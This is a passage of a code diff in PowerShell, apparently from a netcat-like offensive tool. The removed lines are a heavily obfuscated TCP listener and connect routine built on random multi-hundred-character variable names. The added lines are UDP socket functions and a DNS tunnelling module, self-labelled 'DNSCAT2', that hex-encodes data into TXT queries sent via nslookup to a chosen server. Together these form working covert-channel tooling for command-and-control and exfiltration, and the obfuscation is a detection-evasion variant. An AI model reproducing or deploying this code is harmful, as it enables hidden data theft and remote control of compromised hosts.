+    $FuncVars["StreamDestinationBuffer"] = New-Object System.Byte[] $FuncVars["BufferSize"]
+    $FuncVars["StreamReadOperation"] = $FuncVars["Socket"].Client.BeginReceiveFrom($FuncVars["StreamDestinationBuffer"],0,$FuncVars["BufferSize"],([System.Net.Sockets.SocketFlags]::None),[ref]$FuncVars["EndPoint"],$null,$null)
+    return $FuncVars
+  }
+  function ReadData_UDP
   {
-       $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["l"] = $tRue
-        Write-Verbose ("Listening on [0x0] (port " + $p + ")")
-$CLG6lw4V8yfuxLlIRWwOSmOsYaSKXznowoSMqoWtlkqBGBfpDzKgrEo2UTj567DTAulpUWyECvlb7Z6jTYX9NhWkMUS1zlo2GKjQ8L3TaOZXte38bE0QGiswoIfdewdMSPDO94vkl9ubirQFYrvyrg7msWJzB0gnSJVxwrtnRwwvasnzcirsfxRlTNxm9UUyzLFZkE9xTwv = New-Object System.Net.Sockets.TcpListener $p
-        $CLG6lw4V8yfuxLlIRWwOSmOsYaSKXznowoSMqoWtlkqBGBfpDzKgrEo2UTj567DTAulpUWyECvlb7Z6jTYX9NhWkMUS1zlo2GKjQ8L3TaOZXte38bE0QGiswoIfdewdMSPDO94vkl9ubirQFYrvyrg7msWJzB0gnSJVxwrtnRwwvasnzcirsfxRlTNxm9UUyzLFZkE9xTwv.Start()
-         $DyHEuCrzgEHLWqKyRsaxA7RqgSwpTUEEDkDV4N9X2vBaNhdM0FyMC2gVIvHz0SilUYroDGoUUjEyaksM8PjOTj4JUhtudS8Dci0g9LM3KxJRbqibYBerEqpsVrDMdXl6cLL6jLr9qK8RzsCR9PVXjNWpbOWvb88nXNZstMHc4k1NcdScDiIH4YJ338tbVRHSwKyL9JvpEGH6UiKfkoth7o2jMCKN2tJg1KEG2vI0xJdImhYvttXe0Rs56mllg5YpKruT1Qs6OXwwllE1c6jpTaCXizHKjxlSJEnvHig7L0LSBC6IXTUJhDX4tc3npXFGSn86bCzpF65uPEWcgn3dij9dKUsnn25UdZxcluk85O2joJsgxSgqZIST9WqbxwPRA7T3s7nRReqGePgDudT3dRQgVf76qvRTg0QXjrJO9AVaysdkcJyNFwo6pnM1UUEudLqEZ66bm9edWgXLTCbnZF918CxOfIHes3bMgwuYSW9jau1LOl7kDHgbenCfOKtzVnU64l3SMEnritnQPVEPHZbEVfvrSvqsxfgsqiVKZjx9cD8z1xiHC21gKfBN1YROpKMx7vf63enpMVjIb1WLZ2m1i17FMTNGo2HnNyKXk1tmW76NnMTM6LLWcbccRzuAMpArrf39d7zufugD7mH639Pk2dwzB0pWOZ5P46GmU1oNZZdQZQg2dugdpehJW1UJ8QGRXz3gJX1hQu6EGw6wSHTUQUPpP8qWpHhuWc = $CLG6lw4V8yfuxLlIRWwOSmOsYaSKXznowoSMqoWtlkqBGBfpDzKgrEo2UTj567DTAulpUWyECvlb7Z6jTYX9NhWkMUS1zlo2GKjQ8L3TaOZXte38bE0QGiswoIfdewdMSPDO94vkl9ubirQFYrvyrg7msWJzB0gnSJVxwrtnRwwvasnzcirsfxRlTNxm9UUyzLFZkE9xTwv.BeginAcceptTcpClient($NUll, $NUll)
-        }
+    param($FuncVars)
+    $Data = $null
+    if($FuncVars["StreamReadOperation"].IsCompleted)
+    {
+      $StreamBytesRead = $FuncVars["Socket"].Client.EndReceiveFrom($FuncVars["StreamReadOperation"],[ref]$FuncVars["EndPoint"])
+      if($StreamBytesRead -eq 0){break}
+      $Data = $FuncVars["StreamDestinationBuffer"][0..([int]$StreamBytesRead-1)]
+      $FuncVars["StreamReadOperation"] = $FuncVars["Socket"].Client.BeginReceiveFrom($FuncVars["StreamDestinationBuffer"],0,$FuncVars["BufferSize"],([System.Net.Sockets.SocketFlags]::None),[ref]$FuncVars["EndPoint"],$null,$null)
+    }
+    return $Data,$FuncVars
+  }
+  function WriteData_UDP
+  {
+    param($Data,$FuncVars)
+    $FuncVars["Socket"].Client.SendTo($Data,$FuncVars["EndPoint"]) | Out-Null
+    return $FuncVars
+  }
+  function Close_UDP
+  {
+    param($FuncVars)
+    $FuncVars["Socket"].Close()
+  }
+  ############### UDP FUNCTIONS ###############
   
- $p2hqIuzHyLmfQvW08KBevbB6fB6bPXLLbUBdPY76K7VVJIghT9vs5riWZ0wY06MmcDWsU09ARmR98G0cyHjmzuJufApxiuadwDGLe1YKuV4fi4B2g7gwn1O7wUmX489Mz358Z0vQBuoZk8yR4yNt32a9ppTzrRn5MK6HIDfkilLqcykZx5cqmkxONUu3nBQJwJcmvGzY1MC1m8sf1gtqmnElIJvpv1RIOuYEKyRa0Vo33O53GBFRTdPsxyTiaFvIInCGXMbHBI7UCb3E22NCU34SJrRbXa5fRBaOUjQNno23F1aT7kmO4KhnavxZDdUG384j1LA37Mh1restTdxsd1a7CsLMDUxAi43tMJOpO12tSVZtwGzBUwtvuRh5kPfqHDXU0Dau4w4li7Gf5NjfuxH6Ak2jbHbSiIlIDKnLC4meJ5SsMSNgJ4P0HlVYWcDxqTOxKJj3S0bGAG1HJ1Ifwj6JZfavFyoYf27vKWTCi9dscgIfgIE7wKIma5W0hyJUJvTiz9OPK1jjX3hjXbgMQ72qTfvwanOWb5oki4YAtWBtzmtGV7jctkDevqayqNMbsoA8BICKrnpgPV1HEe6AjUacMdhlbG0vZEQk1P8r8EqaPlqhs3h6BIg2hgucVN5fDyKyxvz5hAe0xCKG9aj9culGTjx89xxQs = [SysTEM.DIAGNOsTics.stOPwAtcH]::StartNew()
-while($tRue)
+  ############### DNS FUNCTIONS ###############
+  function Setup_DNS
   {
-      if($DeAjpfP1s5Zyzh8D4CaEcy0QukgMn3xfMmgSqayJRTcbGU9owS6k1uccSfLyV8uNENTh81oWvhNsUNv2Dlj0y3lnkGEv4BX3UNlbPEfBRNBcxhm7ab68ZMUBTY3KTx0sR3xq2ANsjryRZpsxVf7cO3J4E8DJX9G3RPvCOYLVGZ5raF7md8gwqjiQKKe56IgmnP47M3H9jPdZFUBOTL6CtiGSkAyQwKASfUXBRkiwhrod2kzzXIawHkFxD095DXb7GcFKt4PIDoqdFjYtRhGfwr1v2gnfgXjebmxInovjyA7nlecbrHE5njLwExkQZbAs3WQqGKFncM5NTE5xeY4PyHCiuxMQdR7inZsZQrp5BEdVaeRV03DdLAxjQ8M8Os.UI.RawUI.KeyAvailable)
-   {
-   if(@(17,27) -contains ($DeAjpfP1s5Zyzh8D4CaEcy0QukgMn3xfMmgSqayJRTcbGU9owS6k1uccSfLyV8uNENTh81oWvhNsUNv2Dlj0y3lnkGEv4BX3UNlbPEfBRNBcxhm7ab68ZMUBTY3KTx0sR3xq2ANsjryRZpsxVf7cO3J4E8DJX9G3RPvCOYLVGZ5raF7md8gwqjiQKKe56IgmnP47M3H9jPdZFUBOTL6CtiGSkAyQwKASfUXBRkiwhrod2kzzXIawHkFxD095DXb7GcFKt4PIDoqdFjYtRhGfwr1v2gnfgXjebmxInovjyA7nlecbrHE5njLwExkQZbAs3WQqGKFncM5NTE5xeY4PyHCiuxMQdR7inZsZQrp5BEdVaeRV03DdLAxjQ8M8Os.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown,IncludeKeyUp").VirtualKeyCode))
+    param($FuncSetupVars)
+    if($global:Verbose){$Verbose = $True}
+    function ConvertTo-HexArray
     {
-       if($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["l"]){$CLG6lw4V8yfuxLlIRWwOSmOsYaSKXznowoSMqoWtlkqBGBfpDzKgrEo2UTj567DTAulpUWyECvlb7Z6jTYX9NhWkMUS1zlo2GKjQ8L3TaOZXte38bE0QGiswoIfdewdMSPDO94vkl9ubirQFYrvyrg7msWJzB0gnSJVxwrtnRwwvasnzcirsfxRlTNxm9UUyzLFZkE9xTwv.Stop()}
-        else{$CLG6lw4V8yfuxLlIRWwOSmOsYaSKXznowoSMqoWtlkqBGBfpDzKgrEo2UTj567DTAulpUWyECvlb7Z6jTYX9NhWkMUS1zlo2GKjQ8L3TaOZXte38bE0QGiswoIfdewdMSPDO94vkl9ubirQFYrvyrg7msWJzB0gnSJVxwrtnRwwvasnzcirsfxRlTNxm9UUyzLFZkE9xTwv.Close()}
-      $p2hqIuzHyLmfQvW08KBevbB6fB6bPXLLbUBdPY76K7VVJIghT9vs5riWZ0wY06MmcDWsU09ARmR98G0cyHjmzuJufApxiuadwDGLe1YKuV4fi4B2g7gwn1O7wUmX489Mz358Z0vQBuoZk8yR4yNt32a9ppTzrRn5MK6HIDfkilLqcykZx5cqmkxONUu3nBQJwJcmvGzY1MC1m8sf1gtqmnElIJvpv1RIOuYEKyRa0Vo33O53GBFRTdPsxyTiaFvIInCGXMbHBI7UCb3E22NCU34SJrRbXa5fRBaOUjQNno23F1aT7kmO4KhnavxZDdUG384j1LA37Mh1restTdxsd1a7CsLMDUxAi43tMJOpO12tSVZtwGzBUwtvuRh5kPfqHDXU0Dau4w4li7Gf5NjfuxH6Ak2jbHbSiIlIDKnLC4meJ5SsMSNgJ4P0HlVYWcDxqTOxKJj3S0bGAG1HJ1Ifwj6JZfavFyoYf27vKWTCi9dscgIfgIE7wKIma5W0hyJUJvTiz9OPK1jjX3hjXbgMQ72qTfvwanOWb5oki4YAtWBtzmtGV7jctkDevqayqNMbsoA8BICKrnpgPV1HEe6AjUacMdhlbG0vZEQk1P8r8EqaPlqhs3h6BIg2hgucVN5fDyKyxvz5hAe0xCKG9aj9culGTjx89xxQs.Stop()
-     break
-       }
+      param($String)
+      $Hex = @()
+      $String.ToCharArray() | % {"{0:x}" -f [byte]$_} | % {if($_.Length -eq 1){"0" + [string]$_} else{[string]$_}} | % {$Hex += $_}
+      return $Hex
+    }
+    
+    function SendPacket
+    {
+      param($Packet,$DNSServer,$DNSPort)
+      $Command = ("set type=TXT`nserver $DNSServer`nset port=$DNSPort`nset domain=.com`nset retry=1`n" + $Packet + "`nexit")
+      $result = ($Command | nslookup 2>&1 | Out-String)
+      if($result.Contains('"')){return ([regex]::Match($result.replace("bio=",""),'(?<=")[^"]*(?=")').Value)}
+      else{return 1}
+    }
+    
+    function Create_SYN
+    {
+      param($SessionId,$SeqNum,$Tag,$Domain)
+      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "00" + $SessionId + $SeqNum + "0000" + $Domain)
+    }
+    
+    function Create_FIN
+    {
+      param($SessionId,$Tag,$Domain)
+      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "02" + $SessionId + "00" + $Domain)
+    }
+    
+    function Create_MSG
+    {
+      param($SessionId,$SeqNum,$AcknowledgementNumber,$Data,$Tag,$Domain)
+      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "01" + $SessionId + $SeqNum + $AcknowledgementNumber + $Data + $Domain)
+    }
+    
+    function DecodePacket
+    {
+      param($Packet)
+      
+      if((($Packet.Length)%2 -eq 1) -or ($Packet.Length -eq 0)){return 1}
+      $AcknowledgementNumber = ($Packet[10..13] -join "")
+      $SeqNum = ($Packet[14..17] -join "")
+      [byte[]]$ReturningData = @()
+      
+      if($Packet.Length -gt 18)
+      {
+        $PacketElim = $Packet.Substring(18)
+        while($PacketElim.Length -gt 0)
+        {
+          $ReturningData += [byte[]][Convert]::ToInt16(($PacketElim[0..1] -join ""),16)
+          $PacketElim = $PacketElim.Substring(2)
         }
-  if($p2hqIuzHyLmfQvW08KBevbB6fB6bPXLLbUBdPY76K7VVJIghT9vs5riWZ0wY06MmcDWsU09ARmR98G0cyHjmzuJufApxiuadwDGLe1YKuV4fi4B2g7gwn1O7wUmX489Mz358Z0vQBuoZk8yR4yNt32a9ppTzrRn5MK6HIDfkilLqcykZx5cqmkxONUu3nBQJwJcmvGzY1MC1m8sf1gtqmnElIJvpv1RIOuYEKyRa0Vo33O53GBFRTdPsxyTiaFvIInCGXMbHBI7UCb3E22NCU34SJrRbXa5fRBaOUjQNno23F1aT7kmO4KhnavxZDdUG384j1LA37Mh1restTdxsd1a7CsLMDUxAi43tMJOpO12tSVZtwGzBUwtvuRh5kPfqHDXU0Dau4w4li7Gf5NjfuxH6Ak2jbHbSiIlIDKnLC4meJ5SsMSNgJ4P0HlVYWcDxqTOxKJj3S0bGAG1HJ1Ifwj6JZfavFyoYf27vKWTCi9dscgIfgIE7wKIma5W0hyJUJvTiz9OPK1jjX3hjXbgMQ72qTfvwanOWb5oki4YAtWBtzmtGV7jctkDevqayqNMbsoA8BICKrnpgPV1HEe6AjUacMdhlbG0vZEQk1P8r8EqaPlqhs3h6BIg2hgucVN5fDyKyxvz5hAe0xCKG9aj9culGTjx89xxQs.Elapsed.TotalSeconds -gt $t)
-  {
-     if(!$l){$CLG6lw4V8yfuxLlIRWwOSmOsYaSKXznowoSMqoWtlkqBGBfpDzKgrEo2UTj567DTAulpUWyECvlb7Z6jTYX9NhWkMUS1zlo2GKjQ8L3TaOZXte38bE0QGiswoIfdewdMSPDO94vkl9ubirQFYrvyrg7msWJzB0gnSJVxwrtnRwwvasnzcirsfxRlTNxm9UUyzLFZkE9xTwv.Close()}
-    else{$CLG6lw4V8yfuxLlIRWwOSmOsYaSKXznowoSMqoWtlkqBGBfpDzKgrEo2UTj567DTAulpUWyECvlb7Z6jTYX9NhWkMUS1zlo2GKjQ8L3TaOZXte38bE0QGiswoIfdewdMSPDO94vkl9ubirQFYrvyrg7msWJzB0gnSJVxwrtnRwwvasnzcirsfxRlTNxm9UUyzLFZkE9xTwv.Stop()}
-    $p2hqIuzHyLmfQvW08KBevbB6fB6bPXLLbUBdPY76K7VVJIghT9vs5riWZ0wY06MmcDWsU09ARmR98G0cyHjmzuJufApxiuadwDGLe1YKuV4fi4B2g7gwn1O7wUmX489Mz358Z0vQBuoZk8yR4yNt32a9ppTzrRn5MK6HIDfkilLqcykZx5cqmkxONUu3nBQJwJcmvGzY1MC1m8sf1gtqmnElIJvpv1RIOuYEKyRa0Vo33O53GBFRTdPsxyTiaFvIInCGXMbHBI7UCb3E22NCU34SJrRbXa5fRBaOUjQNno23F1aT7kmO4KhnavxZDdUG384j1LA37Mh1restTdxsd1a7CsLMDUxAi43tMJOpO12tSVZtwGzBUwtvuRh5kPfqHDXU0Dau4w4li7Gf5NjfuxH6Ak2jbHbSiIlIDKnLC4meJ5SsMSNgJ4P0HlVYWcDxqTOxKJj3S0bGAG1HJ1Ifwj6JZfavFyoYf27vKWTCi9dscgIfgIE7wKIma5W0hyJUJvTiz9OPK1jjX3hjXbgMQ72qTfvwanOWb5oki4YAtWBtzmtGV7jctkDevqayqNMbsoA8BICKrnpgPV1HEe6AjUacMdhlbG0vZEQk1P8r8EqaPlqhs3h6BIg2hgucVN5fDyKyxvz5hAe0xCKG9aj9culGTjx89xxQs.Stop()
-      Write-Verbose "Timeout!" ; break
- break
-   }
-     if($DyHEuCrzgEHLWqKyRsaxA7RqgSwpTUEEDkDV4N9X2vBaNhdM0FyMC2gVIvHz0SilUYroDGoUUjEyaksM8PjOTj4JUhtudS8Dci0g9LM3KxJRbqibYBerEqpsVrDMdXl6cLL6jLr9qK8RzsCR9PVXjNWpbOWvb88nXNZstMHc4k1NcdScDiIH4YJ338tbVRHSwKyL9JvpEGH6UiKfkoth7o2jMCKN2tJg1KEG2vI0xJdImhYvttXe0Rs56mllg5YpKruT1Qs6OXwwllE1c6jpTaCXizHKjxlSJEnvHig7L0LSBC6IXTUJhDX4tc3npXFGSn86bCzpF65uPEWcgn3dij9dKUsnn25UdZxcluk85O2joJsgxSgqZIST9WqbxwPRA7T3s7nRReqGePgDudT3dRQgVf76qvRTg0QXjrJO9AVaysdkcJyNFwo6pnM1UUEudLqEZ66bm9edWgXLTCbnZF918CxOfIHes3bMgwuYSW9jau1LOl7kDHgbenCfOKtzVnU64l3SMEnritnQPVEPHZbEVfvrSvqsxfgsqiVKZjx9cD8z1xiHC21gKfBN1YROpKMx7vf63enpMVjIb1WLZ2m1i17FMTNGo2HnNyKXk1tmW76NnMTM6LLWcbccRzuAMpArrf39d7zufugD7mH639Pk2dwzB0pWOZ5P46GmU1oNZZdQZQg2dugdpehJW1UJ8QGRXz3gJX1hQu6EGw6wSHTUQUPpP8qWpHhuWc.IsCompleted)
+      }
+      
+      return $Packet,$ReturningData,$AcknowledgementNumber,$SeqNum
+    }
+    
+    function AcknowledgeData
     {
-       if(!$l)
- {
+      param($ReturningData,$AcknowledgementNumber)
+      $Hex = [string]("{0:x}" -f (([uint16]("0x" + $AcknowledgementNumber) + $ReturningData.Length) % 65535))
+      if($Hex.Length -ne 4){$Hex = (("0"*(4-$Hex.Length)) + $Hex)}
+      return $Hex
+    }
+    $FuncVars = @{}
+    $FuncVars["DNSServer"],$FuncVars["DNSPort"],$FuncVars["Domain"],$FuncVars["FailureThreshold"] = $FuncSetupVars
+    if($FuncVars["DNSPort"] -eq ''){$FuncVars["DNSPort"] = "53"}
+    $FuncVars["Tag"] = ""
+    $FuncVars["Domain"] = ("." + $FuncVars["Domain"])
+    
+    $FuncVars["Create_SYN"] = ${function:Create_SYN}
+    $FuncVars["Create_MSG"] = ${function:Create_MSG}
+    $FuncVars["Create_FIN"] = ${function:Create_FIN}
+    $FuncVars["DecodePacket"] = ${function:DecodePacket}
+    $FuncVars["ConvertTo-HexArray"] = ${function:ConvertTo-HexArray}
+    $FuncVars["AckData"] = ${function:AcknowledgeData}
+    $FuncVars["SendPacket"] = ${function:SendPacket}
+    $FuncVars["SessionId"] = ([string](Get-Random -Maximum 9999 -Minimum 1000))
+    $FuncVars["SeqNum"] = ([string](Get-Random -Maximum 9999 -Minimum 1000))
+    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
+    $FuncVars["Failures"] = 0
+    
+    $SYNPacket = (Invoke-Command $FuncVars["Create_SYN"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["Tag"],$FuncVars["Domain"]))
+    $ResponsePacket = (Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($SYNPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]))
+    $DecodedPacket = (Invoke-Command $FuncVars["DecodePacket"] -ArgumentList @($ResponsePacket))
+    if($DecodedPacket -eq 1){return "Bad SYN response. Ensure your server is set up correctly."}
+    $ReturningData = $DecodedPacket[1]
+    if($ReturningData -ne ""){$FuncVars["InputData"] = ""}
+    $FuncVars["AckNum"] = $DecodedPacket[2]
+    $FuncVars["MaxMSGDataSize"] = (244 - (Invoke-Command $FuncVars["Create_MSG"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["AckNum"],"",$FuncVars["Tag"],$FuncVars["Domain"])).Length)
+    if($FuncVars["MaxMSGDataSize"] -le 0){return "Domain name is too long."}
+    return $FuncVars
+  }
+  function ReadData_DNS
+  {
+    param($FuncVars)
+    if($global:Verbose){$Verbose = $True}
+    
+    $PacketsData = @()
+    $PacketData = ""
+    
+    if($FuncVars["InputData"] -ne $null)
+    {
+      $Hex = (Invoke-Command $FuncVars["ConvertTo-HexArray"] -ArgumentList @($FuncVars["InputData"]))
+      $SectionCount = 0
+      $PacketCount = 0
+      foreach($Char in $Hex)
+      {
+        if($SectionCount -ge 30)
+        {
+          $SectionCount = 0
+          $PacketData += "."
+        }
+        if($PacketCount -ge ($FuncVars["MaxMSGDataSize"]))
+        {
+          $PacketsData += $PacketData.TrimEnd(".")
+          $PacketCount = 0
+          $SectionCount = 0
+          $PacketData = ""
+        }
+        $PacketData += $Char
+        $SectionCount += 2
+        $PacketCount += 2
+      }
+      $PacketData = $PacketData.TrimEnd(".")
+      $PacketsData += $PacketData
+      $FuncVars["InputData"] = ""
+    }
+    else
+    {
+      $PacketsData = @("")
+    }
+    
+    [byte[]]$ReturningData = @()
+    foreach($PacketData in $PacketsData)
+    {
+      try{$MSGPacket = Invoke-Command $FuncVars["Create_MSG"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["AckNum"],$PacketData,$FuncVars["Tag"],$FuncVars["Domain"])}
+      catch{ Write-Verbose "DNSCAT2: Failed to create packet." ; $FuncVars["Failures"] += 1 ; continue }
+      try{$Packet = (Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($MSGPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]))}
+      catch{ Write-Verbose "DNSCAT2: Failed to send packet." ; $FuncVars["Failures"] += 1 ; continue }
       try
       {
-       $CLG6lw4V8yfuxLlIRWwOSmOsYaSKXznowoSMqoWtlkqBGBfpDzKgrEo2UTj567DTAulpUWyECvlb7Z6jTYX9NhWkMUS1zlo2GKjQ8L3TaOZXte38bE0QGiswoIfdewdMSPDO94vkl9ubirQFYrvyrg7msWJzB0gnSJVxwrtnRwwvasnzcirsfxRlTNxm9UUyzLFZkE9xTwv.EndConnect($DyHEuCrzgEHLWqKyRsaxA7RqgSwpTUEEDkDV4N9X2vBaNhdM0FyMC2gVIvHz0SilUYroDGoUUjEyaksM8PjOTj4JUhtudS8Dci0g9LM3KxJRbqibYBerEqpsVrDMdXl6cLL6jLr9qK8RzsCR9PVXjNWpbOWvb88nXNZstMHc4k1NcdScDiIH4YJ338tbVRHSwKyL9JvpEGH6UiKfkoth7o2jMCKN2tJg1KEG2vI0xJdImhYvttXe0Rs56mllg5YpKruT1Qs6OXwwllE1c6jpTaCXizHKjxlSJEnvHig7L0LSBC6IXTUJhDX4tc3npXFGSn86bCzpF65uPEWcgn3dij9dKUsnn25UdZxcluk85O2joJsgxSgqZIST9WqbxwPRA7T3s7nRReqGePgDudT3dRQgVf76qvRTg0QXjrJO9AVaysdkcJyNFwo6pnM1UUEudLqEZ66bm9edWgXLTCbnZF918CxOfIHes3bMgwuYSW9jau1LOl7kDHgbenCfOKtzVnU64l3SMEnritnQPVEPHZbEVfvrSvqsxfgsqiVKZjx9cD8z1xiHC21gKfBN1YROpKMx7vf63enpMVjIb1WLZ2m1i17FMTNGo2HnNyKXk1tmW76NnMTM6LLWcbccRzuAMpArrf39d7zufugD7mH639Pk2dwzB0pWOZ5P46GmU1oNZZdQZQg2dugdpehJW1UJ8QGRXz3gJX1hQu6EGw6wSHTUQUPpP8qWpHhuWc)
- $RXJCVMqITIAFjRrxVDml3NlIyeTGgpkyw0E2ATrxqpqqjbuBDJr81dDUY0bXw8fSmka9L5qYNVrJHGbdwep2gq12EBeIB0lNy7rB8MMwmAqMWK2IHtyqLATNDW8iNgcbHzNWhluAcJjC98Y8AfCYT12uP4aL7rs8iKQNLDer5cix2F8o2bfqtzcegSWcr8jDq51ysAiaiEDD4hHbvj4NJhum0W = $CLG6lw4V8yfuxLlIRWwOSmOsYaSKXznowoSMqoWtlkqBGBfpDzKgrEo2UTj567DTAulpUWyECvlb7Z6jTYX9NhWkMUS1zlo2GKjQ8L3TaOZXte38bE0QGiswoIfdewdMSPDO94vkl9ubirQFYrvyrg7msWJzB0gnSJVxwrtnRwwvasnzcirsfxRlTNxm9UUyzLFZkE9xTwv.GetStream()
-         $5s7xhVSYYA04REbWDpYADgRmMIgyLu2axvx1lclbPoPiPoTsxAuiRqwBzHMOCoNrXJzWYngiScWHjwnRvLtR3kQNy5JPMIFTr11KLCYM6HUQIUXXcl5s2ohoxX54vm2OiL7twlQVaAUlZO6VnaDu6rxblxZcOSG3MLWqpziKHoABYjsMT2YuaHZaghna023ScB3sGCe3a9JbKdablO8xMWEvvw3gXnGXOC8Fat32pO0PFwkfcrJcHTcHg3IenYW5yisO3GsRKyTKRA1v019oQzpiYtKENuQiWmED1PPEDpDixlFCBwdzUGTeaOsUlG9dDgHulHXKhkejt9ZiHMRR8EUWMKNdvKD7sPhiVnbDiyKNRykjnlNxyQ1iXISj5Trj5cAjlXqnaWAQGnQoP1nIbj1QkVDKpXs6fzmCoapW7l8VViItFQYiAbOsx9c9T3LBe8hbmgJ67ur8Unymhmo6z0J5K29mVL8ESJWtplkuvbYrDtOPJ0MeD0o3VfF4ci10w0zjmgQRitZLhzRnFGe36L5tjIYNJlavezKWaAxWzFRrvD4F6bonhwIFHnhLCyrncBd1hlAoveEjH5qyrCvU1z5DO6mpxj03jxFN9DZneL3VqX7 = $CLG6lw4V8yfuxLlIRWwOSmOsYaSKXznowoSMqoWtlkqBGBfpDzKgrEo2UTj567DTAulpUWyECvlb7Z6jTYX9NhWkMUS1zlo2GKjQ8L3TaOZXte38bE0QGiswoIfdewdMSPDO94vkl9ubirQFYrvyrg7msWJzB0gnSJVxwrtnRwwvasnzcirsfxRlTNxm9UUyzLFZkE9xTwv.ReceiveBufferSize
-       Write-Verbose ("Connection to " + $C + ":" + $p + " [tcp] succeeded!")
-   }
-  catch{$CLG6lw4V8yfuxLlIRWwOSmOsYaSKXznowoSMqoWtlkqBGBfpDzKgrEo2UTj567DTAulpUWyECvlb7Z6jTYX9NhWkMUS1zlo2GKjQ8L3TaOZXte38bE0QGiswoIfdewdMSPDO94vkl9ubirQFYrvyrg7msWJzB0gnSJVxwrtnRwwvasnzcirsfxRlTNxm9UUyzLFZkE9xTwv.Close(); $p2hqIuzHyLmfQvW08KBevbB6fB6bPXLLbUBdPY76K7VVJIghT9vs5riWZ0wY06MmcDWsU09ARmR98G0cyHjmzuJufApxiuadwDGLe1YKuV4fi4B2g7gwn1O7wUmX489Mz358Z0vQBuoZk8yR4yNt32a9ppTzrRn5MK6HIDfkilLqcykZx5cqmkxONUu3nBQJwJcmvGzY1MC1m8sf1gtqmnElIJvpv1RIOuYEKyRa0Vo33O53GBFRTdPsxyTiaFvIInCGXMbHBI7UCb3E22NCU34SJrRbXa5fRBaOUjQNno23F1aT7kmO4KhnavxZDdUG384j1LA37Mh1restTdxsd1a7CsLMDUxAi43tMJOpO12tSVZtwGzBUwtvuRh5kPfqHDXU0Dau4w4li7Gf5NjfuxH6Ak2jbHbSiIlIDKnLC4meJ5SsMSNgJ4P0HlVYWcDxqTOxKJj3S0bGAG1HJ1Ifwj6JZfavFyoYf27vKWTCi9dscgIfgIE7wKIma5W0hyJUJvTiz9OPK1jjX3hjXbgMQ72qTfvwanOWb5oki4YAtWBtzmtGV7jctkDevqayqNMbsoA8BICKrnpgPV1HEe6AjUacMdhlbG0vZEQk1P8r8EqaPlqhs3h6BIg2hgucVN5fDyKyxvz5hAe0xCKG9aj9culGTjx89xxQs.Stop(); break}
- }
-   else
-  {
-   $P48n3ySOQK8UVajm60WNGPL8YbKm2K7E0qsWyoV8kIv0Udc4TN3Fb2SHSvsrOjijXFYnhaj0QwVRp7LGzcAIvIsdeTAGLgjtsiTfGtwe2wuhvnuDubT9EsdyKkpat6S2o82UN8tqTDte4r2MRFBFP3FrcPNFQfkqvIBwj6GQjjyeuO8kyFk8IyRb0lSPYoEwo1EkPHkcxqfN29CydI5WP2ovNFJbBsM3uIMMarRN2IKL5YvPXX51oawHDWeWdW8g7IDtKzPa3nSY3cNBtAvRiS66bNltqdzgypDIi9BelauYrV8zLk2fDZ2lBT2iCfEBuaKYUJ16UhzL0aEqsa2wELqzCQmBbWJ4O1xRJPRGLqhGg1rZGoaUCLvRKj88RDxem0SLkg8qK2OkLgJCj02XWAH6RIQHiTHbdgpJusM3lvNkMXCmdC11svRxHL27DS6CYKHws4eowm458sI2dvuzmAC1EkTEVnj6RhLfDjrPuP88WnTQjAgUweQIMgs9BEqKuzehwGtQ69MAE2cdX0MUY4CbdHxCdsB7T3JeoDB0cGJI9EeV37mPgrNueCuTHCFRR63nVzALee9dRnTAMygl8IQF24Mv24vDR21tig1lljVDhUF7fUL3DIy04fNSQvxLZXd8WgUf15FUmEK0BeicFv7xvbCENZKOwlxfN168KE01zYugJs5ePehXigNlq07DfQiKkAP9S2q4Dv1AjOEYKfnJqlGEd1XijvBoQ3efqJoWA80EaTMaFkI0h4OKWRIx22D9KfALYoxW = $CLG6lw4V8yfuxLlIRWwOSmOsYaSKXznowoSMqoWtlkqBGBfpDzKgrEo2UTj567DTAulpUWyECvlb7Z6jTYX9NhWkMUS1zlo2GKjQ8L3TaOZXte38bE0QGiswoIfdewdMSPDO94vkl9ubirQFYrvyrg7msWJzB0gnSJVxwrtnRwwvasnzcirsfxRlTNxm9UUyzLFZkE9xTwv.EndAcceptTcpClient($DyHEuCrzgEHLWqKyRsaxA7RqgSwpTUEEDkDV4N9X2vBaNhdM0FyMC2gVIvHz0SilUYroDGoUUjEyaksM8PjOTj4JUhtudS8Dci0g9LM3KxJRbqibYBerEqpsVrDMdXl6cLL6jLr9qK8RzsCR9PVXjNWpbOWvb88nXNZstMHc4k1NcdScDiIH4YJ338tbVRHSwKyL9JvpEGH6UiKfkoth7o2jMCKN2tJg1KEG2vI0xJdImhYvttXe0Rs56mllg5YpKruT1Qs6OXwwllE1c6jpTaCXizHKjxlSJEnvHig7L0LSBC6IXTUJhDX4tc3npXFGSn86bCzpF65uPEWcgn3dij9dKUsnn25UdZxcluk85O2joJsgxSgqZIST9WqbxwPRA7T3s7nRReqGePgDudT3dRQgVf76qvRTg0QXjrJO9AVaysdkcJyNFwo6pnM1UUEudLqEZ66bm9edWgXLTCbnZF918CxOfIHes3bMgwuYSW9jau1LOl7kDHgbenCfOKtzVnU64l3SMEnritnQPVEPHZbEVfvrSvqsxfgsqiVKZjx9cD8z1xiHC21gKfBN1YROpKMx7vf63enpMVjIb1WLZ2m1i17FMTNGo2HnNyKXk1tmW76NnMTM6LLWcbccRzuAMpArrf39d7zufugD7mH639Pk2dwzB0pWOZ5P46GmU1oNZZdQZQg2dugdpehJW1UJ8QGRXz3gJX1hQu6EGw6wSHTUQUPpP8qWpHhuWc)
